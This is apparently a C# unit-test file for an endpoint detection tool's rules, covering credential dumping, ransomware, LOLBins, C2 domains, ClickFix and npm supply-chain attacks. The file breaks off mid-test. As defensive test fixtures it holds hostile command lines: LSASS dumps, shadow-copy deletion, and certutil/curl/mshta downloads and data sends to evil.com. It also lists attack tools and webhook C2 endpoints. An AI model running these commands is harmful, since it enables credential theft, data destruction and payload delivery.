using System;
using System.Collections.Generic;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// Comprehensive tests for all detection rules in Rules.cs.
    /// Covers positive detection, negative (no-fire) cases, edge cases,
    /// confidence values, tier assignments, and response actions.
    /// </summary>
    public class DetectionRuleTests
    {
        private static FusedTelemetryContext MakeContext(TelemetryEvent te)
        {
            return new FusedTelemetryContext
            {
                ProcessId = te.ProcessId,
                ProcessName = te.ProcessName,
                TriggeringEvent = te
            };
        }

        #region LsassAccessRule Tests

        [Theory]
        [InlineData("procdump.exe -ma lsass.exe C:\\temp\\dump.dmp", "procdump")]
        [InlineData("mimikatz.exe minidump lsass", "mimikatz")]
        [InlineData("rundll32 comsvcs.dll minidump lsass", "rundll32")]
        public void LsassAccessRule_Detects_KnownDumpPatterns(string cmdLine, string procName)
        {
            var rule = new LsassAccessRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = procName,
                ImagePath = $@"C:\Temp\{procName}.exe",
                CommandLine = cmdLine,
                ProcessId = 100
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("LsassAccessRule", result!.RuleName);
            Assert.Equal(DetectionTier.Tier1Behavioral, result.Tier);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
            Assert.Equal(SignalType.LsassAccess, result.SignalType);
            Assert.True(result.Confidence >= 0.90);
        }

        [Theory]
        [InlineData("notepad.exe C:\\readme.txt", "notepad")]
        [InlineData("chrome.exe https://google.com", "chrome")]
        [InlineData("powershell.exe Get-Process", "powershell")]
        public void LsassAccessRule_DoesNotFire_OnBenignCommands(string cmdLine, string procName)
        {
            var rule = new LsassAccessRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = procName,
                ImagePath = $@"C:\Windows\System32\{procName}.exe",
                CommandLine = cmdLine,
                ProcessId = 200
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void LsassAccessRule_DoesNotFire_OnNetworkTelemetry()
        {
            var rule = new LsassAccessRule();
            var nt = new NetworkTelemetry
            {
                ProcessName = "lsass.exe",
                ProcessId = 4,
                RemoteAddress = "192.168.1.1",
                RemotePort = 443
            };
            var result = rule.Evaluate(MakeContext(nt));
            Assert.Null(result);
        }

        [Fact]
        public void LsassAccessRule_CaseInsensitive()
        {
            var rule = new LsassAccessRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "evil.exe",
                ImagePath = @"C:\Temp\evil.exe",
                CommandLine = "evil.exe PROCDUMP LSASS MINIDUMP",
                ProcessId = 300
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
        }

        #endregion

        #region RansomwareDetectionRule Tests

        [Theory]
        [InlineData("vssadmin.exe delete shadows /all /quiet")]
        [InlineData("vssadmin delete shadows /for=C: /oldest")]
        [InlineData("VSSADMIN.EXE DELETE SHADOWS /ALL")]
        public void RansomwareRule_Detects_ShadowCopyDeletion(string cmdLine)
        {
            var rule = new RansomwareDetectionRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "vssadmin.exe",
                ImagePath = @"C:\Windows\System32\vssadmin.exe",
                CommandLine = cmdLine,
                ProcessId = 400
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("RansomwareDetectionRule", result!.RuleName);
            Assert.Equal(DetectionTier.Tier1Behavioral, result.Tier);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
            Assert.Equal(SignalType.Ransomware, result.SignalType);
            Assert.True(result.Confidence >= 0.95);
        }

        [Theory]
        [InlineData(".locked")]
        [InlineData(".enc")]
        [InlineData(".crypto")]
        public void RansomwareRule_Detects_SuspiciousRenames(string extension)
        {
            var rule = new RansomwareDetectionRule();
            var ft = new FileActivityTelemetry
            {
                ProcessName = "malware.exe",
                ProcessId = 401,
                FilePath = @"C:\Users\Admin\Documents\report.docx",
                OperationType = "RENAME",
                TargetPath = $@"C:\Users\Admin\Documents\report.docx{extension}"
            };
            var result = rule.Evaluate(MakeContext(ft));
            Assert.NotNull(result);
            Assert.Equal(SignalType.Ransomware, result!.SignalType);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
        }

        [Theory]
        [InlineData(".docx")]
        [InlineData(".pdf")]
        [InlineData(".txt")]
        [InlineData(".xlsx")]
        public void RansomwareRule_DoesNotFire_NormalFileRenames(string extension)
        {
            var rule = new RansomwareDetectionRule();
            var ft = new FileActivityTelemetry
            {
                ProcessName = "word.exe",
                ProcessId = 402,
                FilePath = @"C:\Users\Admin\Documents\temp.tmp",
                OperationType = "RENAME",
                TargetPath = $@"C:\Users\Admin\Documents\report{extension}"
            };
            var result = rule.Evaluate(MakeContext(ft));
            Assert.Null(result);
        }

        [Fact]
        public void RansomwareRule_DoesNotFire_VssadminWithoutDelete()
        {
            var rule = new RansomwareDetectionRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "vssadmin.exe",
                ImagePath = @"C:\Windows\System32\vssadmin.exe",
                CommandLine = "vssadmin list shadows",
                ProcessId = 403
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion

        #region ReverseShellRule Tests

        [Theory]
        [InlineData("powershell.exe -nop -w hidden -enc SQBFAFgA")]
        [InlineData("powershell.exe -enc aaa -sta -noni")]
        [InlineData("powershell.exe -EncodedCommand abc123 -windowstyle hidden")]
        [InlineData("powershell.exe -enc base64 downloadstring")]
        public void ReverseShellRule_Detects_EncodedWithEvasion(string cmdLine)
        {
            var rule = new ReverseShellRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = cmdLine,
                ProcessId = 500
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("ReverseShellRule", result!.RuleName);
            Assert.Equal(DetectionTier.Tier1Behavioral, result.Tier);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
            Assert.Equal(SignalType.ReverseShell, result.SignalType);
        }

        [Theory]
        [InlineData("powershell.exe -enc SQBFAFgA")]
        [InlineData("powershell.exe -EncodedCommand YWJj")]
        public void ReverseShellRule_DemotesToTier2_EncodedWithoutEvasion(string cmdLine)
        {
            var rule = new ReverseShellRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = cmdLine,
                ProcessId = 501
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
            Assert.Equal(ResponseAction.LogOnly, result.AuthorizedResponse);
            Assert.True(result.Confidence <= 0.60);
        }

        [Fact]
        public void ReverseShellRule_DoesNotFire_PlainPowerShell()
        {
            var rule = new ReverseShellRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = "powershell.exe Get-ChildItem C:\\",
                ProcessId = 502
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void ReverseShellRule_DoesNotFire_NonPowerShellProcess()
        {
            var rule = new ReverseShellRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "notepad.exe",
                ImagePath = @"C:\Windows\System32\notepad.exe",
                CommandLine = "notepad.exe -enc something",
                ProcessId = 503
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion

        #region ThreatIntelInjectionRule Tests

        [Theory]
        [InlineData("VirtualAllocEx")]
        [InlineData("WriteProcessMemory")]
        [InlineData("CreateRemoteThread")]
        [InlineData("NtMapViewOfSection")]
        [InlineData("QueueUserAPC")]
        [InlineData("SetThreadContext")]
        public void ThreatIntelInjectionRule_Detects_InjectionAPIs(string apiName)
        {
            var rule = new ThreatIntelInjectionRule();
            var tit = new ThreatIntelTelemetry
            {
                ProcessName = "malware.exe",
                ProcessId = 600,
                TargetProcessId = 4444,
                ApiName = apiName
            };
            var result = rule.Evaluate(MakeContext(tit));
            Assert.NotNull(result);
            Assert.Equal("ThreatIntelInjectionRule", result!.RuleName);
            Assert.Equal(SignalType.ProcessInjection, result.SignalType);
            Assert.Equal(ResponseAction.QuarantineAndKill, result.AuthorizedResponse);
            Assert.Equal(DetectionTier.Tier1Behavioral, result.Tier);
        }

        [Theory]
        [InlineData("chrome")]
        [InlineData("msedge")]
        [InlineData("firefox")]
        [InlineData("brave")]
        [InlineData("electron")]
        public void ThreatIntelInjectionRule_SkipsBrowsers(string browserName)
        {
            var rule = new ThreatIntelInjectionRule();
            var tit = new ThreatIntelTelemetry
            {
                ProcessName = browserName,
                ProcessId = 601,
                TargetProcessId = 602,
                ApiName = "VirtualAllocEx"
            };
            var result = rule.Evaluate(MakeContext(tit));
            Assert.Null(result);
        }

        [Fact]
        public void ThreatIntelInjectionRule_DoesNotFire_UnrelatedAPI()
        {
            var rule = new ThreatIntelInjectionRule();
            var tit = new ThreatIntelTelemetry
            {
                ProcessName = "app.exe",
                ProcessId = 603,
                TargetProcessId = 604,
                ApiName = "ReadFile"
            };
            var result = rule.Evaluate(MakeContext(tit));
            Assert.Null(result);
        }

        [Fact]
        public void ThreatIntelInjectionRule_Metadata_ContainsTargetPid()
        {
            var rule = new ThreatIntelInjectionRule();
            var tit = new ThreatIntelTelemetry
            {
                ProcessName = "injector.exe",
                ProcessId = 605,
                TargetProcessId = 9999,
                ApiName = "NtWriteVirtualMemory"
            };
            var result = rule.Evaluate(MakeContext(tit));
            Assert.NotNull(result);
            Assert.Equal("9999", result!.Metadata["TargetProcessId"]);
        }

        #endregion

        #region PrivilegeEscalationRule Tests

        [Theory]
        [InlineData("godpotato.exe -cmd cmd.exe", "godpotato.exe")]
        [InlineData("printspoofer.exe -c whoami", "printspoofer.exe")]
        [InlineData("tokenvator.exe", "tokenvator.exe")]
        [InlineData("wevtutil.exe cl Security", "wevtutil.exe")]
        [InlineData("wevtutil.exe cl Application", "wevtutil.exe")]
        [InlineData("wevtutil clear-log System", "wevtutil.exe")]
        public void PrivilegeEscalationRule_Detects_KnownPatterns(string cmdLine, string procName)
        {
            var rule = new PrivilegeEscalationRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = procName,
                ImagePath = $@"C:\Temp\{procName}",
                CommandLine = cmdLine,
                ProcessId = 700,
                ParentProcessName = "cmd.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("PrivilegeEscalationRule", result!.RuleName);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
        }

        [Fact]
        public void PrivilegeEscalationRule_Skips_FodHelper_FromExplorer()
        {
            var rule = new PrivilegeEscalationRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "fodhelper.exe",
                ImagePath = @"C:\Windows\System32\fodhelper.exe",
                CommandLine = "fodhelper.exe",
                ProcessId = 701,
                ParentProcessName = "explorer"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void PrivilegeEscalationRule_Skips_COM_Embedding()
        {
            var rule = new PrivilegeEscalationRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "eventvwr.exe",
                ImagePath = @"C:\Windows\System32\eventvwr.exe",
                CommandLine = "eventvwr.exe -Embedding",
                ProcessId = 702,
                ParentProcessName = "svchost.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void PrivilegeEscalationRule_Detects_DllHijack()
        {
            var rule = new PrivilegeEscalationRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "app.exe",
                ImagePath = @"C:\temp\version.dll",
                CommandLine = @"rundll32 C:\temp\version.dll,DllMain",
                ProcessId = 703,
                ParentProcessName = "cmd.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
        }

        [Fact]
        public void PrivilegeEscalationRule_Detects_NamedPipe_FromShell()
        {
            var rule = new PrivilegeEscalationRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "cmd.exe",
                ImagePath = @"C:\Windows\System32\cmd.exe",
                CommandLine = @"cmd.exe /c echo test > \\.\pipe\evilpipe",
                ProcessId = 704,
                ParentProcessName = "malware.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
        }

        [Fact]
        public void PrivilegeEscalationRule_Skips_NamedPipe_NonShell()
        {
            var rule = new PrivilegeEscalationRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "vscode.exe",
                ImagePath = @"C:\Program Files\VSCode\vscode.exe",
                CommandLine = @"vscode.exe --pipe=\\.\pipe\vscode-ipc",
                ProcessId = 705,
                ParentProcessName = "explorer.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion

        #region AttackToolsRule Tests

        [Theory]
        [InlineData("certutil -urlcache -split -f http://evil.com/payload.exe", "certutil.exe")]
        [InlineData("bitsadmin /transfer job http://evil.com/malware.exe C:\\temp\\m.exe", "bitsadmin.exe")]
        [InlineData("mshta vbscript:Execute(\"CreateObject...\")", "mshta.exe")]
        [InlineData("mshta http://evil.com/payload.hta", "mshta.exe")]
        [InlineData("regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll", "regsvr32.exe")]
        [InlineData("rundll32 javascript:\"..eval..\"", "rundll32.exe")]
        [InlineData("wmic process call create \"cmd /c whoami\"", "wmic.exe")]
        public void AttackToolsRule_Detects_LOLBins(string cmdLine, string procName)
        {
            var rule = new AttackToolsRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = procName,
                ImagePath = $@"C:\Windows\System32\{procName}",
                CommandLine = cmdLine,
                ProcessId = 800
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("AttackToolsRule", result!.RuleName);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
        }

        [Theory]
        [InlineData("mimikatz.exe", "mimikatz")]
        [InlineData("rubeus.exe kerberoast", "rubeus")]
        [InlineData("bloodhound.exe --CollectionMethod All", "bloodhound")]
        [InlineData("crackmapexec smb 192.168.1.0/24", "crackmapexec")]
        public void AttackToolsRule_Detects_CredentialAndADTools(string cmdLine, string procName)
        {
            var rule = new AttackToolsRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = $"{procName}.exe",
                ImagePath = $@"C:\Temp\{procName}.exe",
                CommandLine = cmdLine,
                ProcessId = 801
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
        }

        [Theory]
        [InlineData("comsvcs.dll,minidump")]
        [InlineData("comsvcs.dll,#24")]
        public void AttackToolsRule_Detects_LOLLibs(string cmdLine)
        {
            var rule = new AttackToolsRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "rundll32.exe",
                ImagePath = @"C:\Windows\System32\rundll32.exe",
                CommandLine = $"rundll32 {cmdLine} 656 full",
                ProcessId = 802
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
        }

        [Fact]
        public void AttackToolsRule_Detects_JunctionLPE()
        {
            var rule = new AttackToolsRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "cmd.exe",
                ImagePath = @"C:\Windows\System32\cmd.exe",
                CommandLine = @"cmd /c mklink /j C:\Temp\link C:\Windows\System32\config",
                ProcessId = 803
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Contains("Junction LPE", result!.Evidence);
        }

        [Fact]
        public void AttackToolsRule_APTTools_RequireWordBoundary()
        {
            var rule = new AttackToolsRule();
            // "fscan" inside "filesystem_scanner" should NOT match
            var pt = new ProcessTelemetry
            {
                ProcessName = "filesystem_scanner.exe",
                ImagePath = @"C:\Tools\filesystem_scanner.exe",
                CommandLine = "filesystem_scanner.exe -dir C:\\",
                ProcessId = 804
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void AttackToolsRule_APTTools_ExactFilenameMatches()
        {
            var rule = new AttackToolsRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "fscan.exe",
                ImagePath = @"C:\Temp\fscan.exe",
                CommandLine = "fscan.exe -h 10.0.0.0/8",
                ProcessId = 805
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
        }

        [Fact]
        public void AttackToolsRule_DoesNotFire_BenignCertutil()
        {
            var rule = new AttackToolsRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "certutil.exe",
                ImagePath = @"C:\Windows\System32\certutil.exe",
                CommandLine = "certutil -verify cert.cer",
                ProcessId = 806
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion

        #region CampaignIocRule Tests

        [Theory]
        [InlineData("svchosts.exe")]
        [InlineData("svchost.exe.exe")]
        [InlineData("windowsupdate.exe")]
        [InlineData("system32.exe")]
        [InlineData("kernel32.exe")]
        public void CampaignIocRule_Detects_MaliciousFilenames(string filename)
        {
            var rule = new CampaignIocRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = filename,
                ImagePath = $@"C:\Temp\{filename}",
                CommandLine = filename,
                ProcessId = 900
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("CampaignIocRule", result!.RuleName);
            Assert.Equal(DetectionTier.Tier2Indicator, result.Tier);
        }

        [Theory]
        [InlineData("pastebin.com/raw/abc123")]
        [InlineData("discord.com/api/webhooks/1234/token")]
        [InlineData("https://webhook.site/uuid")]
        [InlineData("https://api.telegram.org/bot123/sendMessage")]
        [InlineData("some.onion.link")]
        public void CampaignIocRule_Detects_C2Domains(string domain)
        {
            var rule = new CampaignIocRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "malware.exe",
                ImagePath = @"C:\Temp\malware.exe",
                CommandLine = $"curl {domain}",
                ProcessId = 901
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
        }

        [Fact]
        public void CampaignIocRule_DoesNotFire_LegitProcessNames()
        {
            var rule = new CampaignIocRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "svchost.exe",
                ImagePath = @"C:\Windows\System32\svchost.exe",
                CommandLine = "svchost.exe -k netsvcs",
                ProcessId = 902
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion

        #region UnsignedBinaryRule Tests

        [Theory]
        [InlineData(@"C:\Users\Admin\AppData\Local\Temp\dropper.exe")]
        [InlineData(@"C:\Users\Admin\Downloads\payload.exe")]
        public void UnsignedBinaryRule_Detects_SuspiciousPaths(string path)
        {
            var rule = new UnsignedBinaryRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "dropper.exe",
                ImagePath = path,
                CommandLine = "dropper.exe",
                ProcessId = 1000
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("UnsignedBinaryRule", result!.RuleName);
            Assert.Equal(DetectionTier.Tier2Indicator, result.Tier);
        }

        [Theory]
        [InlineData(@"C:\Users\Admin\AppData\Local\Programs\app.exe")]
        [InlineData(@"C:\Users\Admin\AppData\Local\Microsoft\Teams\app.exe")]
        [InlineData(@"C:\Users\Admin\AppData\Local\Google\Chrome\chrome.exe")]
        [InlineData(@"C:\Users\Admin\AppData\Local\Slack\app.exe")]
        public void UnsignedBinaryRule_TrustedAppDataPath_ButUnsigned_StillSuspicious(string path)
        {
            // v2.8.1 hardening: a "trusted" AppData path fragment is attacker-controllable and no
            // longer self-authorizes. These fixture paths point at nonexistent files, so the
            // Authenticode check treats them as UNSIGNED - an impostor dropped in a known-app dir.
            // It must stay Tier2 observe-fuel, NOT be silently skipped (the old behavior/bypass).
            // Real apps in these dirs (Chrome, Slack, Teams) are code-signed and remain exonerated,
            // which the signed-exempt test below verifies.
            var rule = new UnsignedBinaryRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "app.exe",
                ImagePath = path,
                CommandLine = "app.exe",
                ProcessId = 1001
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
        }

        [Fact]
        public void UnsignedBinaryRule_SignedBinary_InSystemPath_NotSuspicious()
        {
            // A genuinely signed binary that is NOT in a user-writable path is never suspicious.
            // Guards the benign/no-FP direction of the signature-anchored allow-list.
            var signed = System.IO.Path.Combine(
                System.Environment.GetFolderPath(System.Environment.SpecialFolder.System), "notepad.exe");
            if (!System.IO.File.Exists(signed) ||
                !SecurityValidation.VerifyAuthenticodeSignature(signed))
                return; // environment without a verifiable signed notepad - skip rather than flake

            var rule = new UnsignedBinaryRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "notepad.exe",
                ImagePath = signed,
                CommandLine = "notepad.exe",
                ProcessId = 1002
            };
            Assert.Null(rule.Evaluate(MakeContext(pt)));
        }

        [Theory]
        [InlineData(@"C:\Program Files\App\app.exe")]
        [InlineData(@"C:\Windows\System32\notepad.exe")]
        public void UnsignedBinaryRule_DoesNotFire_SystemPaths(string path)
        {
            var rule = new UnsignedBinaryRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "app.exe",
                ImagePath = path,
                CommandLine = "app.exe",
                ProcessId = 1002
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void UnsignedBinaryRule_DoesNotFire_NoPathSeparator()
        {
            var rule = new UnsignedBinaryRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "app.exe",
                ImagePath = "app.exe",
                CommandLine = "app.exe",
                ProcessId = 1003
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion

        #region ClickFixDetectionRule Tests

        [Theory]
        [InlineData("powershell.exe -NoProfile -Command \"[System.Convert]::FromBase64String('x')| iex\"", "explorer.exe")]
        [InlineData("powershell.exe Invoke-WebRequest http://evil.com/dl", "chrome.exe")]
        [InlineData("powershell.exe -enc AAAA", "explorer.exe")]
        [InlineData("cmd.exe /c curl http://evil.com/payload | powershell", "msedge.exe")]
        [InlineData("mshta http://evil.com/file.hta", "firefox.exe")]
        public void ClickFixRule_Detects_PasteRunFromBrowserOrExplorer(string cmdLine, string parent)
        {
            var rule = new ClickFixDetectionRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = cmdLine.Split(' ')[0],
                ImagePath = @"C:\Windows\System32\" + cmdLine.Split(' ')[0],
                CommandLine = cmdLine,
                ProcessId = 1100,
                ParentProcessName = parent
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("ClickFixDetectionRule", result!.RuleName);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
            Assert.True(result.Confidence >= 0.90);
        }

        [Fact]
        public void ClickFixRule_DoesNotFire_WrongParent()
        {
            var rule = new ClickFixDetectionRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = "powershell.exe -enc AAAA",
                ProcessId = 1101,
                ParentProcessName = "svchost.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void ClickFixRule_DoesNotFire_BenignShellFromExplorer()
        {
            var rule = new ClickFixDetectionRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = "powershell.exe Get-Help",
                ProcessId = 1102,
                ParentProcessName = "explorer.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void ClickFixRule_DoesNotFire_NonShellProcess()
        {
            var rule = new ClickFixDetectionRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "notepad.exe",
                ImagePath = @"C:\Windows\System32\notepad.exe",
                CommandLine = "notepad.exe -enc hello",
                ProcessId = 1103,
                ParentProcessName = "explorer.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion

        #region NpmSupplyChainRule Tests

        [Theory]
        [InlineData("node.exe", "powershell.exe", "powershell -enc abc http://evil.com")]
        [InlineData("npm.exe", "cmd.exe", "cmd /c curl https://evil.com/payload")]
        [InlineData("yarn.exe", "powershell.exe", "powershell Invoke-Expression downloadstring")]
        [InlineData("pnpm.exe", "curl.exe", "curl https://evil.com/steal")]
        public void NpmSupplyChainRule_Detects_MaliciousPostinstall(string parent, string child, string cmdLine)
        {
            var rule = new NpmSupplyChainRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = child,
                ImagePath = $@"C:\Windows\System32\{child}",
                CommandLine = cmdLine,
                ProcessId = 1200,
                ParentProcessName = parent
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("NpmSupplyChainRule", result!.RuleName);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
        }

        [Fact]
        public void NpmSupplyChainRule_DoesNotFire_NonNodeParent()
        {
            var rule = new NpmSupplyChainRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = "powershell iex http://evil.com",
                ProcessId = 1201,
                ParentProcessName = "explorer.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void NpmSupplyChainRule_DoesNotFire_NonShellChild()
        {
            var rule = new NpmSupplyChainRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "node.exe",
                ImagePath = @"C:\Program Files\nodejs\node.exe",
                CommandLine = "node index.js",
                ProcessId = 1202,
                ParentProcessName = "npm.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void NpmSupplyChainRule_DoesNotFire_BenignShellUsage()
        {
            var rule = new NpmSupplyChainRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "cmd.exe",
                ImagePath = @"C:\Windows\System32\cmd.exe",
                CommandLine = "cmd /c echo hello world",
                ProcessId = 1203,
                ParentProcessName = "node.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion

        #region ChromeRemoteDebuggingRule Tests

        [Theory]
        [InlineData("chrome.exe", "malware.exe")]
        [InlineData("msedge.exe", "cmd.exe")]
        [InlineData("brave.exe", "powershell.exe")]
        public void ChromeRemoteDebugRule_Detects_NonBrowserParent(string browser, string parent)
        {
            var rule = new ChromeRemoteDebuggingRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = browser,
                ImagePath = $@"C:\Program Files\Browser\{browser}",
                CommandLine = $"{browser} --remote-debugging-port=9222",
                ProcessId = 1300,
                ParentProcessName = parent
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("ChromeRemoteDebuggingRule", result!.RuleName);
            Assert.Equal(SignalType.CredentialTheft, result.SignalType);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
        }

        [Theory]
        [InlineData("chrome.exe", "chrome.exe")]
        [InlineData("msedge.exe", "msedge.exe")]
        public void ChromeRemoteDebugRule_Skips_BrowserParent(string browser, string parent)
        {
            var rule = new ChromeRemoteDebuggingRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = browser,
                ImagePath = $@"C:\Program Files\Browser\{browser}",
                CommandLine = $"{browser} --remote-debugging-port=9222",
                ProcessId = 1301,
                ParentProcessName = parent
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void ChromeRemoteDebugRule_DoesNotFire_NoDebugPort()
        {
            var rule = new ChromeRemoteDebuggingRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "chrome.exe",
                ImagePath = @"C:\Program Files\Google\Chrome\chrome.exe",
                CommandLine = "chrome.exe https://google.com",
                ProcessId = 1302,
                ParentProcessName = "explorer.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        [Fact]
        public void ChromeRemoteDebugRule_DoesNotFire_NonBrowser()
        {
            var rule = new ChromeRemoteDebuggingRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "notepad.exe",
                ImagePath = @"C:\Windows\System32\notepad.exe",
                CommandLine = "notepad.exe --remote-debugging-port=9222",
                ProcessId = 1303,
                ParentProcessName = "cmd.exe"
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion

        #region DllSideloadingDetectionRule Tests

        [Theory]
        [InlineData("onedrive.exe", @"C:\Users\Admin\AppData\Local\Microsoft\OneDrive\onedrive.exe")]
        [InlineData("cmd.exe", @"C:\Users\Admin\Temp\cmd.exe")]
        [InlineData("powershell.exe", @"C:\Users\Admin\AppData\Roaming\powershell.exe")]
        public void DllSideloadingRule_Detects_SystemToolInWriteablePath(string procName, string path)
        {
            var rule = new DllSideloadingDetectionRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = procName,
                ImagePath = path,
                CommandLine = $"{procName} /background",
                ProcessId = 1400
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("DllSideloadingDetectionRule", result!.RuleName);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
        }

        [Fact]
        public void DllSideloadingRule_UnsignedSystemToolInDeveloperBuildPath_NowFires_Tier1()
        {
